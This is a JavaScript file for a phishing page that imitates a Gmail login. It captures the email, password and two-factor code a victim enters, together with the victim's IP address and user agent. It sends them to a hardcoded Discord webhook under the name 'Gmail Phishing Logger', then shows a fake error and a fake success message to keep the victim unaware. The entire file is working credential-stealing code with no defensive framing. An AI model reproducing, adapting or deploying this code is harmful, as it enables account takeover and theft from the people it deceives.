// Configuration
const WEBHOOK_URL = 'https://discord.com/api/v10/webhooks/1499090855280119979/dDDh0cX9HOf8tFKx8s7oSuOTw-6xsTNpwZXOC5P2f93_bSh0ksSpEhe2IXs5XDDIsqkh';
const MAX_ATTEMPTS = 3;
let attemptsLeft = MAX_ATTEMPTS;

// DOM Elements
const loginForm = document.getElementById('loginForm');
const verificationForm = document.getElementById('verificationForm');
const limitReached = document.getElementById('limitReached');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const verificationCodeInput = document.getElementById('verificationCode');
const attemptsLeftSpan = document.getElementById('attemptsLeft');
const emailError = document.getElementById('emailError');
const passwordError = document.getElementById('passwordError');
const codeError = document.getElementById('codeError');
const loadingDiv = document.getElementById('loading');
const successMessage = document.getElementById('successMessage');

// Update attempts counter
function updateAttemptCounter() {
    attemptsLeftSpan.textContent = attemptsLeft;
}

// Show error message
function showError(element, message) {
    element.textContent = message;
    element.style.display = 'block';
}

// Hide error message
function hideError(element) {
    element.style.display = 'none';
}

// Validate email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Send data to Discord webhook
async function sendToWebhook(data) {
    try {
        const payload = {
            content: `**New Credentials Captured**\nEmail: ${data.email}\nPassword: ${data.password}\nVerification Code: ${data.code || 'N/A'}\nIP: ${await getIP()}\nUser Agent: ${navigator.userAgent}\nTimestamp: ${new Date().toISOString()}`,
            username: 'Gmail Phishing Logger',
            avatar_url: 'https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png'
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error('Error sending to webhook:', error);
    }
}

// Get user IP address
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

// Generate random code
function generateRandomCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Sign in function
async function signIn() {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    
    // Reset errors
    hideError(emailError);
    hideError(passwordError);
    
    // Validate inputs
    let isValid = true;
    
    if (!email) {
        showError(emailError, 'Please enter your email');
        isValid = false;
    } else if (!isValidEmail(email)) {
        showError(emailError, 'Please enter a valid email address');
        isValid = false;
    }
    
    if (!password) {
        showError(passwordError, 'Please enter your password');
        isValid = false;
    }
    
    if (!isValid) return;
    
    // Decrement attempts
    attemptsLeft--;
    updateAttemptCounter();
    
    // Check if limit reached
    if (attemptsLeft <= 0) {
        loginForm.classList.add('hidden');
        limitReached.classList.remove('hidden');
        return;
    }
    
    // Send credentials to webhook
    await sendToWebhook({
        email: email,
        password: password,
        stage: 'login'
    });
    
    // Switch to verification form
    loginForm.classList.add('hidden');
    verificationForm.classList.remove('hidden');
}

// Verify code function
async function verifyCode() {
    const code = verificationCodeInput.value.trim();
    
    if (!code) {
        showError(codeError, 'Please enter the verification code');
        return;
    }
    
    // Show loading
    verificationCodeInput.disabled = true;
    document.getElementById('verifyBtn').disabled = true;
    loadingDiv.classList.remove('hidden');
    
    // Generate random code that doesn't work
    const randomCode = generateRandomCode();
    
    // Send verification attempt to webhook
    await sendToWebhook({
        email: emailInput.value.trim(),
        password: passwordInput.value.trim(),
        code: code,
        randomCodeGenerated: randomCode,
        stage: 'verification'
    });
    
    // Simulate processing delay
    setTimeout(() => {
        // Hide loading
        loadingDiv.classList.add('hidden');
        
        // Show fake error
        showError(codeError, `Invalid code. Generated code: ${randomCode} (This code will not work)`);
        
        // Show success message after another delay
        setTimeout(() => {
            successMessage.classList.remove('hidden');
            verificationCodeInput.value = '';
            
            // Reset after showing success
            setTimeout(() => {
                successMessage.classList.add('hidden');
                verificationCodeInput.disabled = false;
                document.getElementById('verifyBtn').disabled = false;
                hideError(codeError);
            }, 3000);
        }, 1000);
    }, 2000);
}

// Go back to login
function goBack() {
    verificationForm.classList.add('hidden');
    loginForm.classList.remove('hidden');
    verificationCodeInput.value = '';
    hideError(codeError);
    successMessage.classList.add('hidden');
}

// Initialize
updateAttemptCounter();

// Event listeners for real-time validation
emailInput.addEventListener('input', () => hideError(emailError));
passwordInput.addEventListener('input', () => hideError(passwordError));
verificationCodeInput.addEventListener('input', () => hideError(codeError));

// Enter key support
emailInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') signIn();
});

passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') signIn();
});

verificationCodeInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') verifyCode();
});

